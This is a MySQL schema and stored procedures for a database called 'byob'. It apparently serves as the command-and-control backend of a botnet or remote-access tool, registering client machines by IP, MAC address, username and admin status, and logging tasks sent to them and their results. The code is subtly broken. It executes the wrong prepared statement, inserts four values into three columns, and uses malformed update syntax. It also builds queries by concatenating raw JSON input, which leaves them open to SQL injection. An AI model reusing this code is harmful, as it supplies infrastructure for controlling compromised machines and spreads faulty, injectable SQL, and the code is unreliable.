CREATE DATABASE IF NOT exists `byob`;
use `byob`;
CREATE TABLE IF NOT exists `tbl_clients` (
    `id` serial,
    `uid` varchar(32) NOT NULL,
    `online` boolean DEFAULT 0,
    `joined` TIMESTAMP,
    `last_online` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    `public_ip` varchar(42) DEFAULT NULL,
    `mac_address` varchar(17) DEFAULT NULL,
    `local_ip` varchar(42) DEFAULT NULL,
    `username` text DEFAULT NULL,
    `administrator` boolean DEFAULT 0,
    `platform` text DEFAULT NULL,
    `device` text DEFAULT NULL,
    `architecture` text DEFAULT NULL,
    PRIMARY KEY (`uid`(32)))
    DEFAULT CHARSET=latin1;
DROP PROCEDURE IF exists `sp_handle_client`;
DELIMITER $$
CREATE DEFINER=`root`@`localhost` PROCEDURE sp_handle_client(IN `info` text, OUT `client` JSON)
BEGIN
    DECLARE tbl text;
    DECLARE row text;
    SET client=JSON_UNQUOTE(info);
    SET client=JSON_MERGE(client, JSON_OBJECT("uid", MD5(CONCAT(client->>'$.public_ip', client->>'$.mac_address')), "online", 1, "joined", NOW()));
    INSERT INTO `tbl_clients`
    (
         online,
         joined,
         last_online,
         uid,
         public_ip,
         local_ip,
         mac_address,
         username,
         administrator,
         device,
         platform,
         architecture
    )
    VALUES
    (
         client->>'$.online',
         client->>'$.joined',
         client->>'$.last_online',
         client->>'$.uid',
         client->>'$.public_ip',
         client->>'$.local_ip',
         client->>'$.mac_address',
         client->>'$.username',
         client->>'$.administrator',
         client->>'$.device',
         client->>'$.platform',
         client->>'$.architecture'
    );
    SET tbl=CONCAT("CREATE TABLE IF NOT EXISTS `", client->>'$.uid', "` (`id` serial, `uid` varchar(32), `task` text DEFAULT NULL, `result` text DEFAULT NULL, `issued` TIMESTAMP, `completed` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`uid`(32))) DEFAULT CHARSET=latin1;");
    PREPARE stmt FROM tbl;
    EXECUTE tbl;
END$$
DROP PROCEDURE IF EXISTS `sp_handle_task`;
DELIMITER $$
CREATE DEFINER=`root`@`localhost` PROCEDURE sp_handle_task(IN `task` text, OUT `@row` text)
BEGIN
    DECLARE `taskid` varchar(32);
    SET task=JSON_UNQUOTE(task);
    SET taskid=MD5(CONCAT(task->>'$.client',task->>'$.task',UNIX_TIMESTAMP()));
    SET @row=CONCAT("INSERT INTO ", task->>'$.client'," (uid, task, issued) VALUES ('", taskid, "','", task->>'$.task', "','", task->>'$.issued', "','", NOW(), "') ON DUPLICATE KEY UPDATE ", task->>'$.client', " SET result='", task->>'$.result', "', completed=NOW() WHERE uid='", task->>'$.taskid', "';");
    PREPARE stmt FROM @row;
    EXECUTE stmt;
END$$
DELIMITER ;
